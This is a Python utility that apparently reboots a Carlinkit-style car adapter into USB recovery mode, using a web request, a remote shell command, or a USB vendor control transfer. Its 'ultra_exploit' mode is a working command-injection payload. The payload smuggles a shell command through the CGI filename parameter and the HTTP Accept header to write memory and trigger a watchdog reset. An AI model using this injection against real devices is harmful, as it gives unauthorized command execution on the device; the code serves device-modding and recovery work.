#!/usr/bin/env python3
from __future__ import annotations

import argparse
import socket
import time

import uploader
import usb.core  # type: ignore[import-untyped]

USB_VID = 0xA108
USB_PID = 0xEAEF
USB_VENDOR_REQ_VID = 0x05AC
USB_VENDOR_REQ_PID = 0x12A8
USB_VENDOR_REQ_TYPE = 0x40
USB_VENDOR_REQ_CODE = 0x88
USB_VENDOR_REQ_WVALUE = 0x0001
USB_VENDOR_REQ_WINDEX = 0x0000

def _parse_usb_id(value: str) -> int:
    try:
        return int(value, 0)
    except ValueError as e:
        raise argparse.ArgumentTypeError(f"invalid USB id '{value}'") from e


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Reboot device to recovery mode")
    p.add_argument(
        "--mode",
        choices=["none", "ultra_exploit", "modern", "vendor_request"],
        default="none",
        help="How to trigger reboot to recovery",
    )
    p.add_argument(
        "--early-host",
        help="Early-stage IP/hostname used for reboot-to-recovery",
    )
    p.add_argument(
        "--verify",
        action=argparse.BooleanOptionalAction,
        default=True,
        help=f"Wait for USB device {USB_VID:04x}:{USB_PID:04x} after reboot",
    )
    p.add_argument(
        "--verify-timeout",
        type=float,
        default=45.0,
        help="Timeout in seconds for USB verification",
    )
    p.add_argument(
        "--vid",
        type=_parse_usb_id,
        default=USB_VID,
        help=f"USB vendor id to verify (default: 0x{USB_VID:04x})",
    )
    p.add_argument(
        "--pid",
        type=_parse_usb_id,
        default=USB_PID,
        help=f"USB product id to verify (default: 0x{USB_PID:04x})",
    )
    p.add_argument(
        "--vendor-vid",
        type=_parse_usb_id,
        default=USB_VENDOR_REQ_VID,
        help=f"USB VID for vendor request mode (default: 0x{USB_VENDOR_REQ_VID:04x})",
    )
    p.add_argument(
        "--vendor-pid",
        type=_parse_usb_id,
        default=USB_VENDOR_REQ_PID,
        help=f"USB PID for vendor request mode (default: 0x{USB_VENDOR_REQ_PID:04x})",
    )
    p.add_argument(
        "--vendor-timeout",
        type=int,
        default=1000,
        help="Vendor request USB timeout in ms",
    )
    return p.parse_args()


def _run_step(argv: list[str]) -> int:
    print(f"[*] uploader {' '.join(argv)}")
    rc = uploader.main(argv)
    if rc != 0:
        print(f"[!] Step failed with exit code {rc}")
    return rc


def _is_http_root_alive(host: str, timeout: float = 1.0) -> bool:
    try:
        with socket.create_connection((host, 80), timeout=timeout) as sock:
            sock.settimeout(timeout)
            req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            sock.sendall(req.encode("ascii"))
            return bool(sock.recv(1))
    except OSError:
        return False


def _run_ultra_exploit(early_host: str) -> int:
    if not _is_http_root_alive(early_host, timeout=1.0):
        print(f"[!] ultra_exploit skipped: {early_host} does not answer on / (1s timeout)")
        return 1

    accept_payload = (
        "devmem${IFS}0x100000cc${IFS}32${IFS}0x42575302;"
        "echo${IFS}wdt${IFS}>/proc/jz/reset/reset;env"
    )
    request = (
        "POST /cgi-bin/submition.cgi?filename=a;sh$IFS-c$IFS$HTTP_ACCEPT;& HTTP/1.1\r\n"
        f"Host: {early_host}\r\n"
        f"Accept: {accept_payload}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 1\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "x"
    ).encode("ascii")

    try:
        sock = socket.create_connection((early_host, 80), timeout=1.0)
        sock.settimeout(1.0)
        sock.sendall(request)
        time.sleep(1.0)
        sock.close()
        print("[+] ultra_exploit request sent, socket closed after 1s (success)")
        return 0
    except OSError as e:
        print(f"[!] ultra_exploit failed: {e}")
        return 1


def _verify_usb_device(timeout_s: float, vid: int, pid: int) -> int:
    print(f"[*] Waiting up to {timeout_s:.1f}s for USB device {vid:04x}:{pid:04x} to appear...")
    deadline = time.monotonic() + max(timeout_s, 0.0)
    while time.monotonic() <= deadline:
        dev = usb.core.find(idVendor=vid, idProduct=pid)
        if dev is not None:
            print(f"[+] USB recovery device detected: {vid:04x}:{pid:04x}")
            return 0
        time.sleep(0.1)
    print(
        f"[!] Timeout waiting for USB recovery device {vid:04x}:{pid:04x} "
        f"({timeout_s:.1f}s)"
    )
    return 1


def _run_vendor_request(
    vendor_vid: int,
    vendor_pid: int,
    timeout_ms: int = 1000,
    *,
    attempts: int = 5,
    retry_delay: float = 2.0,
) -> int:
    last_error: usb.core.USBError | None = None
    for attempt in range(attempts):
        dev = usb.core.find(idVendor=vendor_vid, idProduct=vendor_pid)
        if dev is None:
            print(
                f"[!] vendor_request failed: USB device {vendor_vid:04x}:{vendor_pid:04x} not found"
            )
            return 1

        try:
            dev.ctrl_transfer(
                USB_VENDOR_REQ_TYPE,
                USB_VENDOR_REQ_CODE,
                wValue=USB_VENDOR_REQ_WVALUE,
                wIndex=USB_VENDOR_REQ_WINDEX,
                data_or_wLength=None,
                timeout=timeout_ms,
            )
            print(
                f"[+] vendor_request sent: bmReq=0x{USB_VENDOR_REQ_TYPE:02x} "
                f"bReq=0x{USB_VENDOR_REQ_CODE:02x} wValue=0x{USB_VENDOR_REQ_WVALUE:04x} "
                f"wIndex=0x{USB_VENDOR_REQ_WINDEX:04x} to {vendor_vid:04x}:{vendor_pid:04x}"
            )
            return 0
        except usb.core.USBError as e:
            if e.errno == 5:
                # Live-confirmed multiple times this session: the device
                # often drops off the bus mid-response because this vendor
                # request itself triggers an immediate reboot - an I/O
                # error here is the expected signature of success, not a
                # real failure. Report it as such and let the caller's
                # actual USB-device verification step (run unconditionally
                # afterwards) be the real judge, rather than aborting the
                # whole flow right here.
                print(
                    f"[+] vendor_request sent (device dropped off mid-response while "
                    f"rebooting - expected): {e}"
                )
                return 0
            if e.errno == 32 and attempt < attempts - 1:
                # Live-confirmed: a STALL (pipe error) here doesn't always
                # mean the device rejects this request outright - retrying
                # a couple of seconds later succeeded with no other change,
                # suggesting the gadget's handler for it just isn't
                # registered/ready yet right after a fresh enumeration.
                print(
                    f"[!] vendor_request stalled (device may not be ready yet), "
                    f"retrying in {retry_delay:.1f}s..."
                )
                last_error = e
                time.sleep(retry_delay)
                continue
            print(f"[!] vendor_request failed: {e}")
            return 1

    print(f"[!] vendor_request failed after {attempts} attempts: {last_error}")
    return 1


def run_reboot_to_recovery(
    mode: str,
    early_host: str | None,
    verify: bool = True,
    verify_timeout: float = 45.0,
    vid: int = USB_VID,
    pid: int = USB_PID,
    vendor_vid: int = USB_VENDOR_REQ_VID,
    vendor_pid: int = USB_VENDOR_REQ_PID,
    vendor_timeout: int = 1000,
) -> int:
    if mode == "none":
        print("[*] Reboot-to-recovery mode: none (skipping)")
        return 0

    if mode != "vendor_request" and not early_host:
        print(f"[!] --early-host is required for reboot mode '{mode}'")
        return 2

    if mode == "ultra_exploit":
        assert early_host is not None
        rc = _run_ultra_exploit(early_host)
    elif mode == "modern":
        assert early_host is not None
        rc = _run_step([
            "--host", early_host,
            "--exec-cmd",
            "sh -c \"nohup setsid sh -c 'sleep 2; carlinkit_otalib usboot' >/dev/null 2>&1 </dev/null &\"",
        ])
    elif mode == "vendor_request":
        rc = _run_vendor_request(vendor_vid, vendor_pid, timeout_ms=vendor_timeout)
    else:
        print(f"[!] Unknown reboot-to-recovery mode: {mode}")
        return 2

    if rc != 0:
        return rc

    if not verify:
        print("[*] USB verification disabled")
        return 0

    return _verify_usb_device(verify_timeout, vid=vid, pid=pid)


def main() -> int:
    args = parse_args()
    return run_reboot_to_recovery(
        args.mode,
        args.early_host,
        verify=args.verify,
        verify_timeout=args.verify_timeout,
        vid=args.vid,
        pid=args.pid,
        vendor_vid=args.vendor_vid,
        vendor_pid=args.vendor_pid,
        vendor_timeout=args.vendor_timeout,
    )


if __name__ == "__main__":
    raise SystemExit(main())
